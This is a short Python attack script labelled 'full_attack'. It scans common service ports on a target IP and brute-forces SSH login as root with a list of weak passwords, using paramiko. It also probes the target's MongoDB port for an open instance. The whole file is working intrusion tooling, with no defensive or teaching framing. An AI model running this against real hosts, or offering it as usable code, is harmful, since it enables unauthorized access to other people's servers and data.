import paramiko
import socket
import time
from scapy.all import *
import pymongo

target_ip = "SET IP!!!" #SET IP 
target_ports = [22, 80, 443, 8080, 27017] 
user = "root"  
passwords = ["12345", "admin", "password", "root", "toor", "login123!"]  
timeout = 10 

def port_scan():
    print("[*] port scanning...")
    for port in target_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            print(f"[+] Port {port} is open")
        else:
            print(f"[-] Port {port} je closed")
        sock.close()


def ssh_brute_force():
    print("[*] Start SSH brute-force ...")
    for password in passwords:
        print(f"pass: {password}")
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=user, password=password, timeout=timeout)
            print(f"Success: {password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print(f"Not succesful: {password}")
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)


def mongodb_attack():
    print("[*] Mongo...")
    try:
        mongo_client = pymongo.MongoClient(f"mongodb://{target_ip}:27017")
        mongo_client.admin.command('ping')  
    except Exception as e:
        print(f"[-] Error MongoDB: {e}")

def full_attack():
    port_scan()
    
    ssh_brute_force()
     
    mongodb_attack()

if __name__ == "__main__":
    full_attack()
